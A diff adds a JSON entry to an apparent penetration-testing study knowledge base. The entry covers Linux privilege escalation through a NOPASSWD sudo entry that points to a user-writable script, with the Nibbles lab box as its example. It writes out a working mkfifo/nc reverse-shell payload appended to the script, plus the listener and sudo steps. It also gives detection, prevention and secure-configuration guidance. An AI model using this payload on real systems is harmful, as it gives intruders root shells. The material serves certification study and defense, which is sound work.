@@ -1,0 +1,94 @@
+{
+  "id": "gs-sudo-script-abuse",
+  "name": "Privilege Escalation - Sudo Writable Script Abuse",
+  "type": "command",
+  "platform": "linux",
+  "command": "sudo -l",
+  "description": "When sudoers grants NOPASSWD execution of a script that the current user also owns or can write to, appending a payload and re-running with sudo yields a root shell. The script path in the sudoers entry and write access to that file are both needed.",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - sudo Abuse",
+  "requires": ["local-access"],
+  "protocols": [],
+  "tools": ["sudo", "nc"],
+  "tags": ["sudo", "privesc", "writable-script", "nopasswd"],
+  "mitre": ["T1548.003"],
+  "steps": [
+    {
+      "label": "1. Check sudo permissions",
+      "command": "sudo -l\n# Look for: (root) NOPASSWD: /path/to/script.sh"
+    },
+    {
+      "label": "2. Confirm you own or can write to the script",
+      "command": "ls -la /path/to/script.sh\n# Must be writable by current user"
+    },
+    {
+      "label": "3. Append reverse shell payload (preserves original content)",
+      "command": "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f' | tee -a /path/to/script.sh"
+    },
+    {
+      "label": "4. Start listener on attacker",
+      "command": "nc -lvnp <port>"
+    },
+    {
+      "label": "5. Execute the script as root",
+      "command": "sudo /path/to/script.sh"
+    },
+    {
+      "label": "6. Confirm root",
+      "command": "id"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Nibbles box — actual sudoers entry exploited",
+      "command": "# sudo -l output:\n# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n# File owned by nibbler -> writable -> append payload -> sudo execute -> root"
+    }
+  ],
+  "notes": "The misconfiguration here is two compounding failures: the sudoers entry grants NOPASSWD root execution of a script, AND that script is owned/writable by the same low-privilege user. Controlling both the sudo entry target and the file it points to is equivalent to unrestricted root access.\n\nUse tee -a (append) rather than overwriting the file. Appending preserves the original script content — overwriting could cause a service disruption, which on a real engagement alerts defenders or damages the client environment.\n\nA second listener must be running before sudo executes the script, since the reverse shell payload runs immediately when sudo fires the script as root.\n\nThis technique is the primary Nibbles privilege escalation path: LinEnum surfaces the NOPASSWD sudo entry for monitor.sh, which is owned by nibbler. The same result appears from manual sudo -l.",
+  "references": [
+    {
+      "title": "HTB Academy - Getting Started",
+      "url": "https://academy.hackthebox.com/module/details/77"
+    },
+    {
+      "title": "GTFOBins - sudo",
+      "url": "https://gtfobins.github.io/gtfobins/sudo/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gs-nc-listener",
+      "rel": "prereq",
+      "note": "Start listener before executing the script."
+    },
+    {
+      "id": "gs-privesc-enum",
+      "rel": "prereq",
+      "note": "LinPEAS/LinEnum surface the NOPASSWD sudo entry."
+    },
+    {
+      "id": "gs-sudo-su-basics",
+      "rel": "alternative",
+      "note": "If sudo su - works directly, no script abuse needed."
+    }
+  ],
+  "defense": {
+    "why_it_works": "The sudoers entry grants NOPASSWD root execution of a specific script, while the script file itself is owned by and writable to the same low-privilege user. Controlling both the sudo entry target and the file it points to is equivalent to unrestricted root access — the attacker can write any payload into the script and execute it as root without a password.",
+    "prerequisites": "Low-privilege shell on the target, a NOPASSWD sudoers entry pointing to a user-writable script.",
+    "impact": "Full root shell on the target system.",
+    "detection": "Alert on: (1) modifications to files that appear in sudoers NOPASSWD entries — file integrity monitoring on those paths is high-value. (2) sudo invocations of scripts from user home directories. (3) reverse shell indicators (mkfifo, /dev/tcp, outbound nc) spawning as root.",
+    "artifacts": "tee append to the script file (file modification timestamp and content change); sudo execution log in /var/log/auth.log; outbound network connection from root process.",
+    "prevention": "Audit sudoers for NOPASSWD entries pointing to files in user-writable paths (home directories, /tmp, /var/tmp). Scripts granted sudo execution should be owned by root and not world/group-writable. Prefer specific command allowances over script execution where possible. Use sudo_logsrvd or forward auth.log to a SIEM to alert on unusual sudo patterns.",
+    "misconfiguration": "# Vulnerable sudoers entry:\n# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n#\n# File ownership check:\nls -la /home/nibbler/personal/stuff/monitor.sh\n# -rwxrwxrwx nibbler nibbler monitor.sh  <-- writable by owner = exploitable",
+    "secure_config": "# Secure approach — script owned by root, not writable by the sudo-granted user:\nchown root:root /opt/scripts/monitor.sh\nchmod 755 /opt/scripts/monitor.sh\n# sudoers entry points to /opt/scripts/ not user home\n\n# Audit all NOPASSWD entries for writable targets:\nsudo -l -U <user>\n# Then check ownership of each listed path",
+    "sources": [
+      "MITRE T1548.003",
+      "HTB Academy - Getting Started Module"
+    ]
+  },
+  "certifications": ["CPTS"],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 02: Getting Started",
+  "exam": "exam-ok"
+}
